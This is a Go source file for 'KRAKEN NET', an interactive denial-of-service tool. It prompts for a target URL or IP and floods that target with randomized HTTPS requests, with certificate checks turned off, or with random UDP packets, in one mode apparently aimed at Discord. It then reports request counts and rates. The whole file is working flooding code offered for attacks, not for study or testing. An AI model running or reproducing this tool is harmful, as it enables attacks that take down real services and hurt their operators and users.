package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

const (
	Reset   = "\033[0m"
	Red     = "\033[31m"
	Green   = "\033[32m"
	Yellow  = "\033[33m"
	Cyan    = "\033[36m"
	Magenta = "\033[35m"
)

var userAgents []string
var referers []string
var methodsHTTP = []string{"GET", "POST", "HEAD"}

func printBanner() {
	banner := `

                                            
                                            
                                            
             :*####****+*####=              
         .%#*=--=+++++++++=---+#%=          
      .*#=-----+%========*%------=*#-       
    .#*--------=%=-------+#---------+%=     
   #*=--------=*%*-------*%*==--------+%.   
 :#=-------=#%%%%#-------*%%%%%*=------=#+  
 ++------+%%%%= ##------=%. .#%%%#-------#: 
 +%*=--=#%%= .=%%#------=%*%*: :#%%+---=%%: 
  *%%##%%= :#+=-+%=-----=%=--=%* .%%#*#%%-  
   :#%%#..%+----=%+-----=%=----=#= +%%%+    
        .#-------%+-----=%=------#*         
        .#%=----#%+-----=%%=----*%*         
         =%%*=+%%%%#####%%%%#==%%#          
           *%%%#.-%#===+%= *%%%%-           
             .   %+-----=%   .              
                 %+------*.                 
                 %#=----+%.                 
                 +%%%#%%%#                  
                  .*%%%#-                   
                                            
                                            
 
	KRAKEN NET - v2.1
	Made by Piwiii2.0
`
	fmt.Print(Cyan)
	fmt.Println(banner)
	fmt.Print(Reset)
}

func loadListFromFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	var list []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			list = append(list, line)
		}
	}
	return list
}

func randomFromList(list []string, fallback string) string {
	if len(list) == 0 {
		return fallback
	}
	return list[rand.Intn(len(list))]
}

func randomUserAgent() string {
	return randomFromList(userAgents, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
}

func randomReferer() string {
	return randomFromList(referers, "https://google.com/")
}

func randomMethod() string {
	return methodsHTTP[rand.Intn(len(methodsHTTP))]
}

func randomPath() string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, rand.Intn(10)+5)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

func newHTTPClientTLS(connections int) *http.Client {
	tr := &http.Transport{
		MaxIdleConns:        connections * 2,
		MaxIdleConnsPerHost: connections * 2,
		IdleConnTimeout:     5 * time.Second,
		DisableCompression:  true,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}
	http2.ConfigureTransport(tr)
	return &http.Client{
		Transport: tr,
		Timeout:   6 * time.Second,
	}
}

func sendTLSRequest(client *http.Client, baseURL string) bool {
	req, err := http.NewRequest(randomMethod(), baseURL+randomPath(), nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Referer", randomReferer())
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return resp.StatusCode >= 200 && resp.StatusCode < 500
}

func sendUDP(conn net.Conn, payload []byte) bool {
	_, err := conn.Write(payload)
	return err == nil
}

func generateDiscordPayload() []byte {
	payload := make([]byte, 1024)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}

func generateRandomUDP(size int) []byte {
	payload := make([]byte, size)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}

func runAttack() {
	rand.Seed(time.Now().UnixNano())
	reader := bufio.NewReader(os.Stdin)
	userAgents = loadListFromFile("useragents.txt")
	referers = loadListFromFile("referers.txt")

	fmt.Print(Yellow + "🌐 Target (URL or IP): " + Reset)
	target, _ := reader.ReadString('\n')
	target = strings.TrimSpace(target)

	fmt.Print(Yellow + "🛠 Select method :\nkraken\ntls\nudp-discord\nudp-bypass\n" + Reset)
	mode, _ := reader.ReadString('\n')
	mode = strings.TrimSpace(strings.ToLower(mode))

	var connections int
	if mode == "kraken" || mode == "tls" || mode == "udp-discord" || mode == "udp-bypass" {
		fmt.Print(Yellow + "🔗 Connections per worker: " + Reset)
		cStr, _ := reader.ReadString('\n')
		connections, _ = strconv.Atoi(strings.TrimSpace(cStr))
		if connections < 1 {
			connections = 10
		}
	}

	fmt.Print(Yellow + "🔧 Number of workers: " + Reset)
	wStr, _ := reader.ReadString('\n')
	workers, _ := strconv.Atoi(strings.TrimSpace(wStr))
	if workers < 1 {
		workers = 10
	}

	fmt.Print(Yellow + "⏱️ Duration (in seconds): " + Reset)
	dStr, _ := reader.ReadString('\n')
	durationSec, _ := strconv.Atoi(strings.TrimSpace(dStr))
	if durationSec < 1 {
		durationSec = 30
	}
	attackDuration := time.Duration(durationSec) * time.Second

	var udpPort int
	if mode == "udp-discord" || mode == "udp-bypass" {
		fmt.Print(Yellow + "🎯 UDP Port (target): " + Reset)
		portStr, _ := reader.ReadString('\n')
		udpPort, _ = strconv.Atoi(strings.TrimSpace(portStr))
		if udpPort < 1 {
			udpPort = 5000
		}
	}

	fmt.Println(Green + "🚀 Attack starting..." + Reset)

	var totalSuccess int64
	var totalFail int64
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), attackDuration)
	defer cancel()

	batchSize := 20

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			switch mode {
			case "tls", "kraken":
				client := newHTTPClientTLS(connections)
				for j := 0; j < connections; j += batchSize {
					select {
					case <-ctx.Done():
						return
					default:
						for k := 0; k < batchSize && j+k < connections; k++ {
							if sendTLSRequest(client, target) {
								atomic.AddInt64(&totalSuccess, 1)
							} else {
								atomic.AddInt64(&totalFail, 1)
							}
						}
						time.Sleep(1 * time.Millisecond)
					}
				}

			case "udp-discord", "udp-bypass":
				conns := make([]net.Conn, connections)
				for i := 0; i < connections; i++ {
					c, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, udpPort))
					if err != nil {
						continue
					}
					conns[i] = c
				}
				defer func() {
					for _, c := range conns {
						if c != nil {
							c.Close()
						}
					}
				}()

				for j := 0; j < len(conns); j += batchSize {
					select {
					case <-ctx.Done():
						return
					default:
						for k := 0; k < batchSize && j+k < len(conns); k++ {
							c := conns[j+k]
							if c != nil {
								var payload []byte
								if mode == "udp-discord" {
									payload = generateDiscordPayload()
								} else {
									size := 128 + rand.Intn(256)
									payload = generateRandomUDP(size)
								}
								if sendUDP(c, payload) {
									atomic.AddInt64(&totalSuccess, 1)
								} else {
									atomic.AddInt64(&totalFail, 1)
								}
							}
						}
						time.Sleep(1 * time.Millisecond)
					}
				}
			}
		}()
	}

	wg.Wait()

	total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
	rps := float64(total) / float64(durationSec)

	fmt.Println(Magenta + "🧨 Attack complete. Results:" + Reset)
	fmt.Printf("%s✅ Success requests : %d%s\n", Green, totalSuccess, Reset)
	fmt.Printf("%s❌ Failed requests  : %d%s\n", Red, totalFail, Reset)
	fmt.Printf("%s⏱️ Duration         : %d seconds%s\n", Cyan, durationSec, Reset)
	fmt.Printf("%s📈 Average RPS      : %.2f req/sec%s\n", Yellow, rps, Reset)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	printBanner()
	reader := bufio.NewReader(os.Stdin)

	for {
		runAttack()

		fmt.Print(Yellow + "\n🔄 Do you want to start another attack? (y/n): " + Reset)
		again, _ := reader.ReadString('\n')
		again = strings.TrimSpace(strings.ToLower(again))

		if again != "y" {
			fmt.Println(Green + "👋 Bye! Hope you liked your attacks." + Reset)
			break
		}
	}
}
